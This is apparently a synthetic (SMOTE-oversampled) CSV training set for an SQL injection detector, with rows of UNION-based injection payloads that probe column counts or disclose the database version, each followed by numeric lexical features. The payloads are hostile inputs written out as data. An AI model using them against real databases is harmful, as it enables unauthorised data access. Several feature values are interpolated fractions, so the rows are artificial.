id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000798,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.1824359619653744,62.58016128245442,14.43002688040907,3.012116858145255,47.72010752163628,1.0,4.0,9.86005376081814,0.7627573313902206,0.016015110787259007,0.06406044314903594,0.1571671146734845,0.43002688040906933,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.43002688040907,2.0,0.43002688040906945,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000799,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.3215845601141674,70.51607026985205,19.870982432536987,3.7059123645809464,14.000000000000002,40.51607026985205,4.0,12.0,0.19860521548688634,0.5744173953852436,0.056744347281967505,0.1702330418459026,0.8709824325369875,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.129017567463013,3.0,0.8709824325369874,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000800,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.31918768015382476,76.85835256132806,26.0,3.879225418356742,40.0,4.575057683984204,23.14164743867193,9.141647438671933,0.5204487179676823,0.059464743482594534,0.30112179491920593,0.11896474363051712,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.858352561328068,0.0,0.0,1.0,0.8583525613280676,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000801,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.6328904256342645,72.27826140306996,21.327826140306996,3.6728050241765615,41.62260912245597,9.0,14.0,7.655652280613993,0.5749601604714242,0.12502213307143098,0.19447887366667044,0.10553883279047437,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.655652280613993,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000802,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,0.6744486633105671,59.66439788592865,22.0,3.914088891605088,14.000000000000002,26.671204228142706,9.993193657785943,9.0,0.23470364812364516,0.4476237590037281,0.16679167622171198,0.15088091665091474,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.3321989429643237,0.0,0.0,4.6678010570356765,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000803,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000059,0.02738529144250999,56.023572980880274,16.007857660293425,3.2745049142869425,37.9685693588263,1.0,8.047145961760556,9.007857660293427,0.67776758802083,0.01785000817769966,0.14359914951923392,0.1607832542822365,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0078576602934257,0.007857660293425828,0.0,4.992142339706574,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000804,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.12618145119490307,69.41375997589134,21.075229086525695,3.683641217646353,39.30091634610279,9.0,14.0,7.112843629788545,0.5660555414531395,0.12976017395235107,0.20184915948143503,0.10233512511307433,0.03761454326284819,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.075229086525697,1.0,0.0376145432628483,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000805,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,1.8619310440077397,71.3009634773298,22.0,3.7325854700062613,42.600550558474175,9.0,11.800275279237088,7.900137639618544,0.5977211705326113,0.1274179802734239,0.16436382831102486,0.11049702088293997,0.549931180190728,0.0,0.0,0.0,0.0,1.0,0.0,0.45006881980927194,0.0,0.0,4.900137639618544,1.0,0.5499311801907281,0.0,0.0,1.0,0.0,1.0,0.4500688198092718,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000806,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,0.0065196109049521864,66.99431795753456,22.0,3.5554383361444257,14.000000000000002,28.007576056620593,13.988635915069112,10.998105985844852,0.2089737753252137,0.4180659265351241,0.20879621149816854,0.1641640866414937,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9981059858448522,0.9981059858448521,0.0,5.001894014155148,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000807,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000086,1.412525789012775,60.177601192242086,21.403199829679703,3.7548124043785265,14.000000000000002,21.612799318718807,13.968001703202981,10.596800170320298,0.23342221749110284,0.36226029853583985,0.22811431004575686,0.1762031739273004,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.193600340640596,1.0,0.0,3.4031998296797017,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000808,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.46376496498129555,66.84536041664397,15.169072083328793,3.0371933211576194,50.0,1.0,4.676288333315171,11.169072083328793,0.7485556933776786,0.014971113867553593,0.06940964326338571,0.16706354949138214,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.16907208332879287,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.16907208332879287,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000809,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.21015386880858317,72.53435322278798,16.0,3.11967771573502,42.85496515646078,1.0,17.57251742176961,11.106870644557597,0.5903886464480665,0.013792504829944457,0.24271336514380015,0.1531054835781889,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8931293554424027,0.0,0.0,6.2137412891151955,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000810,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,0.44504950308609986,65.58757040423296,28.058380269488644,4.113191270739934,25.62774648700757,18.27369716072918,16.0,5.686126756496215,0.3930441982819566,0.2760129443345846,0.24462142911278242,0.08632142827067643,0.0,1.0,0.8430633782481075,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.8430633782481074,1.8430633782481074,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000811,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,0.0793671236656943,60.41094298003402,20.0,3.616095244824357,14.000000000000002,24.32875438402722,14.0,8.082188596006805,0.2319635233998866,0.40234824560019444,0.23196352339988657,0.1337247076000324,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.082188596006805,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000812,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.7880314319055771,76.9934048684254,31.0,4.232349322794731,43.34212684209947,3.328936578950268,20.322341447375667,10.0,0.5635833998649387,0.0430228091768238,0.2634679873145202,0.12992580364371725,0.0,0.0,2.0,0.0,1.0,1.6644682894751337,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000813,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.5208815526273164,74.02184172109065,32.591263311563736,4.354371397834106,42.0,3.204368344218132,18.021841721090656,10.795631655781868,0.5678051717095526,0.04317761924212357,0.24292643772059652,0.1460907713277273,0.0,0.0,2.0,0.0,1.0,1.204368344218131,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000814,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,0.23304476658213338,66.930351084568,15.930351084568002,3.152718877481392,41.721404338272,1.0,14.278595661727998,9.930351084568,0.6233060481936609,0.014941123680558999,0.21339687791764447,0.1483559502081357,0.0,0.9303510845680004,0.0,0.0,0.0,0.0,0.0,2.0696489154319995,0.0,0.0,5.9303510845680005,0.0,0.0,0.9303510845680003,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000815,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,0.474185847936501,71.69232292052324,20.46153541589535,3.4558587606914033,14.000000000000002,42.153858336418594,4.0,11.538464584104648,0.19551654506711216,0.5877248939271353,0.05586187001917492,0.16089669098657755,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.538464584104648,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000816,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000074,0.7891125634039862,60.93776825565499,24.068279365692725,3.90566620696037,27.931720634307275,10.869488889962266,17.602419048539083,4.534139682846362,0.4632295145866635,0.17565978043900965,0.2873403330146894,0.07377037195963744,1.0,0.0,0.2670698414231807,0.0,0.0,1.0,0.0,1.267069841423181,0.0,0.0,0.0,1.2670698414231811,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000817,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.10534575443975196,76.95809355147178,26.0,3.8843223108195954,40.0,4.874280654415331,23.0,9.083812897056447,0.5197669613706645,0.0633166682557453,0.29886600278813213,0.11805036758545803,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0419064485282235,0.0,0.0,1.0,0.9580935514717768,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000818,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000003,0.9132688962067903,76.1013439900288,26.79731201994241,3.877772202954726,40.40537596011518,1.9999999999999982,23.898656009971205,9.797312019942412,0.5308876987982915,0.02628115379698262,0.314057689849132,0.12877345755559386,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.8986560099712059,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000819,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.07779323433117186,71.02515329169474,15.97484670830527,3.1138772245521804,49.89938683322108,1.0,8.15091975016838,11.97484670830527,0.7025819249949061,0.014079586601781213,0.11473280045547676,0.16860568794783595,0.9748467083052698,0.0,2.0,0.0,0.0,0.0,0.0,1.0251532916947301,0.0,0.0,7.97484670830527,2.0,0.9748467083052696,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000820,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.4879166465089195,73.07033228204752,15.178388713674586,3.099440276007232,46.713554854698344,1.0,14.0,11.356777427349172,0.6392700613540054,0.013698302656330569,0.191776237188628,0.15525539880103592,0.17838871367458659,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.178388713674586,2.0,0.17838871367458659,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000821,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,0.0788887401916091,62.73222574356868,17.0,3.2622274274067977,38.0,1.0,13.770479208773152,9.961746534795525,0.6060587930114485,0.015948915605564468,0.21918623292027978,0.1588060584627073,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9617465347955254,1.0,0.0,5.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000822,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,0.3086174073077778,79.26841220351074,24.0,3.791128118484568,20.625750658865044,33.80523661053219,14.0,10.837424934113496,0.262845109303257,0.4237246636472164,0.17680320935754396,0.13662701769198268,0.0,1.0,2.9187124670567477,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.918712467056748,3.9187124670567477,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000823,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.2706630730209746,69.8916291487005,19.78325829740102,3.7012628766549507,14.000000000000002,40.0,4.0,11.89162914870051,0.20031411840956373,0.5723260525987535,0.05723260525987536,0.17012722373180736,0.8916291487005097,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.8916291487005096,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000824,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.39400993822964936,71.11181169610909,22.0,3.770902224955746,14.000000000000002,41.689449356887266,4.0,11.422362339221817,0.19710823271728806,0.5859967759069444,0.05631663791922517,0.1605783534565424,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.422362339221817,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000825,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,1.279635724684637,75.61332879228553,20.0,3.439568057227336,14.000000000000002,38.60102005204374,10.0246174804836,12.9876912597582,0.18645772330373178,0.5054281972580104,0.13676544180977684,0.17134863762848107,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.3374362467472667,0.0,0.0,7.650255013010933,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000826,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.44657451232590917,75.99286650918582,22.125891686351775,3.8223634457834947,14.000000000000002,36.0,13.24464988188936,12.748216627296454,0.18447202500873305,0.4743566357367421,0.1735249218477093,0.1676464174068156,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8741083136482266,0.8741083136482268,0.0,7.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000827,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.5111846011710505,66.61434658407211,22.522869316814422,3.808096376089037,14.000000000000002,34.09147726725769,8.0,10.522869316814422,0.21046176354687285,0.5113667242785744,0.12026386488392735,0.15790764729062542,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.522869316814421,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000828,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,3.2213254533218287,75.63850631128003,26.0,3.845525280293049,40.0,1.9999999999999982,24.0,9.63850631128003,0.5288525872892629,0.02644262936446315,0.3173115523735578,0.12739323097271613,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.36149368871996956,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000829,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.26684705716233864,61.54892904530691,16.0,3.214313916923031,41.68632625982462,1.0,8.784184350438451,10.078418435043845,0.6783536359562226,0.01626110678753448,0.14162097710084143,0.16376428015540148,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.15683687008769,0.0,0.0,5.9215815649561545,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000830,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,0.26331221475811334,56.77896581015952,20.0,3.792808031402416,14.000000000000002,20.566520589206924,14.0,8.212445220952596,0.2470934111561212,0.3614461185480803,0.2470934111561212,0.1443670591396773,0.0,0.07081507365086523,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.1416301473017305,3.0,0.0,0.07081507365086526,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
